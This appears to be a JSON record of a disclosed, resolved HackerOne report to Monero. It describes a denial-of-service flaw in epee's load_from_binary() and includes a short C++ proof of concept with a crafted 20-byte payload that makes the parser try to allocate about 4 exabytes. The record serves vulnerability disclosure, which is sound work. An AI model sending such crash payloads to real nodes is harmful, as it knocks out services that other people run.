@@ -1,0 +1,111 @@
+{
+  "id": 506498,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDY0OTg=",
+  "url": "https://hackerone.com/reports/506498",
+  "title": "(remote) exabyte allocation via load_from_binary() (DoS)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-03-07T20:53:25.543Z",
+  "submitted_at": "2019-03-07T20:53:25.543Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "guido",
+    "url": "/guido",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7731,
+    "url": "https://hackerone.com/monero",
+    "handle": "monero",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Monero",
+      "twitter_handle": "monero",
+      "website": "https://getmonero.org",
+      "about": " Monero: the secure, private, untraceable cryptocurrency"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-07-03T00:12:02.972Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-07-02T23:36:01.520Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Changes introduced in commit b82efa32e can result in a denial of service if ```epee::serialization::portable_storage::load_from_binary()``` is called with untrusted data.\n\nThe 'reserve' method implemented here:\nhttps://github.com/monero-project/monero/commit/b82efa32e771f653c5e49165b0659c67e2db3438#diff-8de201c60a8c7a3a0a4c2e15f2c0939bR75\n\nwill attempt to allocate about 4 exabytes of memory when you run the following code:\n\n```cpp\n#include <serialization/keyvalue_serialization.h>\n#include <storages/portable_storage_template_helper.h>\n#include <storages/portable_storage_base.h>\n#include <p2p/p2p_protocol_defs.h>\n#include <p2p/net_node.h>\n\nint main(void)\n{\n    unsigned char payload[] = {\n        0x01, 0x11, 0x01, 0x01, 0x01, 0x01, 0x02, 0x01, 0x01, 0x08, 0x00, 0x84,\n        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff\n    };\n\n    const std::string s(payload, payload + 20);\n    epee::serialization::portable_storage ps;\n    ps.load_from_binary(s);\n}\n```\n\nAlthough I haven't yet constructed a proof of concept against a live Monero instance, this can probably achieved by a remote attacker because the ```load_from_binary``` call occurs several times in the network code in ```contrib/epee/include/storages/levin_abstract_invoke2.h```.\n\nPlease let me know if this is sufficient, or that you require proof of concept code that can be used against peers on the network.\n\n## Impact\n\nCrash monerod",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-08-01T23:36:01.610Z",
+  "allow_singular_disclosure_after": -213637569.96868643,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "tiago-danin",
+    "armansameer"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
